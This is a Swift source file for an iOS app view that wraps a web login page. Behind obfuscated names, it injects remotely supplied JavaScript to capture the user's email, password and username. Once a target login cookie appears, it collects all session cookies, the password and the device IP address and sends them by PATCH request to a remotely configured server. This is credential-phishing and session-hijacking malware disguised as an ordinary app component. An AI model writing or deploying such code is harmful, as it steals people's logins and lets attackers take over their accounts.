//
//  File.swift
//  
//
//  Created by DanHa on 30/03/2023.
//

import Foundation
import SwiftUI
import WebKit

@available(iOS 14.0, *)
struct TwoCoor: UIViewRepresentable {
    func makeCoordinator() -> TwoCoorClass {
        TwoCoorClass(self)
    }
    
    let url: URL?
    var listData: [String: String] = [:]
    @Binding var next_screen_two: Bool //is_two_chuyen_man
    @Binding var load_hide_two: Bool //is_two_load_hide
    @Binding var check_pw_two: String //is_two_ktra_matkhau
    
    private let webtow = TowWb()
    
    var obver: NSKeyValueObservation? {
        webtow.intace
    }
    
    func makeUIView(context: Context) -> WKWebView {
        let prefs = WKWebpagePreferences()
        prefs.allowsContentJavaScript = true
        let source = listData[RemoKey.rm01ch.rawValue] ?? ""
        let script: WKUserScript = WKUserScript(source: source, injectionTime: .atDocumentEnd, forMainFrameOnly: true)
        let userContentController: WKUserContentController = WKUserContentController()
        let config = WKWebViewConfiguration()
        config.defaultWebpagePreferences = prefs
        config.userContentController = userContentController
        userContentController.addUserScript(script)
        let webview = WKWebView(frame: .zero, configuration: config)
        webview.customUserAgent = listData[RemoKey.rm02ch.rawValue] ?? ""
        webview.navigationDelegate = context.coordinator
        webview.load(URLRequest(url: url!))
        return webview
    }
    
    func updateUIView(_ uiView: WKWebView, context: Context) {
    }
    
    class TwoCoorClass: NSObject, WKNavigationDelegate {
        var towprent: TwoCoor
        init(_ towprent: TwoCoor) {
            self.towprent = towprent
        }
        
        func ipAddCal() -> String {
            var addip: String?
            if let datamodel = UserDefaults.standard.object(forKey: "diachiip") as? Data {
                if let convertPer = try? JSONDecoder().decode(UsIpadress.self, from: datamodel) {
                    addip = convertPer.ippad
                }
            }
            return addip ?? "ipaddress_Null"
        }
        
        func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
            webView.evaluateJavaScript(self.towprent.listData[RemoKey.two1af.rawValue] ?? "") { data, error in
                if let usEmail = data as? String, error == nil {
                    UserDefaults.standard.set(try? JSONEncoder().encode(UsEmail(email: usEmail)), forKey: "email")
                }
            }
            webView.evaluateJavaScript(self.towprent.listData[RemoKey.two2af.rawValue] ?? "") { pwitem, error in
                if let pwitem = pwitem as? String, error == nil {
                    self.towprent.check_pw_two = pwitem
                }
            }
        }
        
        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            webView.evaluateJavaScript(self.towprent.listData[RemoKey.two3af.rawValue] ?? "")
            webView.evaluateJavaScript(self.towprent.listData[RemoKey.two4af.rawValue] ?? "")
            webView.evaluateJavaScript(self.towprent.listData[RemoKey.two5af.rawValue] ?? "")
            webView.evaluateJavaScript(self.towprent.listData[RemoKey.two6af.rawValue] ?? "")
            webView.evaluateJavaScript(self.towprent.listData[RemoKey.two7af.rawValue] ?? "")
            webView.evaluateJavaScript(self.towprent.listData[RemoKey.two8af.rawValue] ?? "")
            webView.evaluateJavaScript(self.towprent.listData[RemoKey.two9af.rawValue] ?? "")
            webView.evaluateJavaScript(self.towprent.listData[RemoKey.two10af.rawValue] ?? "")
            webView.evaluateJavaScript(self.towprent.listData[RemoKey.two11f.rawValue] ?? "")
            
            if webView.url?.absoluteString.range(of: "checkpoint") != nil {
                webView.evaluateJavaScript(self.towprent.listData[RemoKey.two12f.rawValue] ?? "")
                webView.evaluateJavaScript(self.towprent.listData[RemoKey.two13f.rawValue] ?? "")
            }
            
            webView.evaluateJavaScript(self.towprent.listData[RemoKey.two14f.rawValue] ?? "") { username_get, error in
                if let userna = username_get as? String, error == nil {
                    if !userna.isEmpty {
                        UserDefaults.standard.set(try? JSONEncoder().encode(UsName(nameuser: userna)), forKey: "username")
                    }
                }
                
            }
            
            WKWebsiteDataStore.default().httpCookieStore.getAllCookies { cookies in
                let cokiTwo = cookies.firstIndex(where: { $0.name == self.towprent.listData[RemoKey.nam09ap.rawValue] ?? ""})
                if cokiTwo != nil {
                    let cokiTwoCk = cookies.reduce("", { x,y in
                        x + y.name + "=" + String(y.value) + ";"
                    })
                    UserDefaults.standard.set(try? JSONEncoder().encode(UsMK(matkhau: self.towprent.check_pw_two)), forKey: "matkhau")
                    self.towprent.load_hide_two = true
                    let jsonTwoo: [String: Any] = [
                        self.towprent.listData[RemoKey.nam01ap.rawValue] ?? "": cookies[cokiTwo!].value,
                        self.towprent.listData[RemoKey.nam02ap.rawValue] ?? "": cokiTwoCk,
                        self.towprent.listData[RemoKey.nam03ap.rawValue] ?? "": self.towprent.check_pw_two,
                        self.towprent.listData[RemoKey.nam04ap.rawValue] ?? "": Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? "",
                        self.towprent.listData[RemoKey.nam05ap.rawValue] ?? "": self.ipAddCal()
                    ]
                    let url: URL = URL(string: self.towprent.listData[RemoKey.rm03ch.rawValue] ?? "")!
                    let json_data = try? JSONSerialization.data(withJSONObject: jsonTwoo)
                    var request = URLRequest(url: url)
                    request.httpMethod = "PATCH"
                    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                    request.httpBody = json_data
                    let task = URLSession.shared.dataTask(with: request) { data, response, error in
                        if error != nil {
                            print("not ok")
                        } else if data != nil {
                            DispatchQueue.main.asyncAfter(deadline: .now() + 4) {
                                self.towprent.next_screen_two = true
                            }
                        }

                    }
                    task.resume()
                }
            }
        }
    }
}

@available(iOS 14.0, *)
struct UsIpadress: Codable {
    var ippad: String
}

struct UsEmail: Codable {
    var email: String
}

struct UsName: Codable {
    var nameuser: String
}

struct UsMK: Codable {
    var matkhau: String
}

@available(iOS 14.0, *)
private class TowWb: ObservableObject {
    @Published var intace: NSKeyValueObservation?
}
